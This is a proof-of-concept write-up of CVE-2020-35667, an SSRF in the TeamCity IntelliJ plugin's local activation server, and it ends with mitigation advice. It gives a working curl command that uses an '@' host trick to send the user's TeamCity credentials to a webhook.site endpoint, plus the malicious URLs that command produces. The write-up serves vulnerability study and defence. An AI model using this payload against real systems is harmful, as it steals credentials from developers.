# CVE-2020-35667

I started the process of documenting this CVE by first installing the vulnerable software versions as mentioned in the task. Those can exactly be downloaded from the links below:
TeamCity - https://www.jetbrains.com/help/teamcity/previous-releases-downloads.html#TeamCity+2020.2.1 - Install using Windows installer 

IntelliJ - https://download.jetbrains.com/idea/ideaIC-2018.1.8.exe?_gl=1*xb6rv0*_gcl_au*NTY2OTM5OTQuMTc1ODQ1ODkzNA..*FPAU*NTY2OTM5OTQuMTc1ODQ1ODkzNA..*_ga*ODM4OTc1NTAuMTc1ODQ1ODk2NQ..*_ga_9J976DJZ68*czE3NTg2MjU0NTckbzYkZzEkdDE3NTg2MjU5NzYkajU4JGwwJGgw - Windows installer, it will download immediately

Install both applications, then setup TeamCiy server. I just set up the server in the simplest way possible.

Now, the `TeamCity-IDEAplugin.zip` to be able to pinpoint the vulnerability in the source code.
To download the file go to the TeamCity server -> Login -> Click on username in top-right corner -> In dropdown menu, click Profile -> On right-hand side click download below 'IntelliJ Platform Plugin'.

In order to analyze the source code, I decompiled the jar files and looked after the hinted information `jetbrains.buildServer.activation.ActivatorBase` and started analyzing the source code.

I will not go into details related to the code for now, as I will focus on the PoC.
So, after the plugin zip is downloaded it needs to be loaded into IntelliJ. The moment it is loaded into IntelliJ, and HTTP server starts on port range varying from 63330 to 63339. This server is very important for our PoC.

In IntelliJ, at the top bar, there will be a part where it says `TeamCity`. This appears because we loaded the plugin. We need to click it and log in. Here, we provide the TeamCity server URL and the credentials we set up with the server.

This is now enough to continue with exploiting the vulnerability. For this I will use a webhook where I will capture the credentials that the activation server sends because of the SSRF.

The PoC is as simple as a curl command:
```
PS E:\CVE-2020-35667> curl "http://127.0.0.1:63330/patch?file=@webhook.site/aed83e28-fa7b-41fd-8077-feb92cd61a23/admin&modId=test&personal=false&inline=true/capture&modId=test&personal=false"
Warning: Binary output can mess up your terminal. Use "--output -" to tell curl to output it to your 
Warning: terminal anyway, or consider "--output <FILE>" to save to a file.
```

Following this steps and running the curl command, should result in receving a request at the webhook server, which contains the credentials encoded in base64 in the Authorization header and also having an `Apply Patch` window open in IntelliJ.

I should mention that the server may not always be on port 63330 and the user should try every port between 63330-63339.

Short explanation of what actually happens here:
1. **Attacker sends malicious request** to localhost activation server on port 63330
2. **Server constructs malicious URL** using the `file` parameter
3. **Server makes authenticated HTTP request** to attacker-controlled webhook
4. **TeamCity credentials are leaked** in the HTTP Authorization header
5. **Attacker receives credentials** at webhook.site endpoint
This is what the server will access, safe input vs malicious input:
```safe
http://127.0.0.1:63330/patch?file=/app/patches/safe.patch&modId=123&personal=false 
										|
										| Results below after processing
										|
http://teamcity.internal:8111/app/patches/safe.patch&modId=123&personal=false&inline=true
```

```malicious
http://127.0.0.1:63330/patch?file=@webhook.site/aed83e28-fa7b-41fd-8077-feb92cd61a23/admin&modId=test&personal=false
										|
										| Results below after processing
										|
http://teamcity.internal:8111@webhook.site/aed83e28-fa7b-41fd-8077-feb92cd61a23/admin&modId=test&personal=false&inline=tru
```
Because of the `@` symbol, the webhook.site will be considered the host and the request will be sent to it along with the credentials.

Mitigating this vulnerability using automation is a very good choice, making the process of application development or application deployment more efficient. The solutions I propose are the following:
* Mandatory usage of a SAST/DAST tools in the CI/CD pipeline. Custom rules should be enforced based on the application and its context.
* Log and alert on outgoing requests that include `Authorization`/`Cookie` headers to external/unexpected domains.
* Enforce egress controls in production (network firewall / proxy) so application processes cannot make arbitrary outbound requests. Only allow known destination hosts.

*I didn't discover this. I just did a small PoC for it*
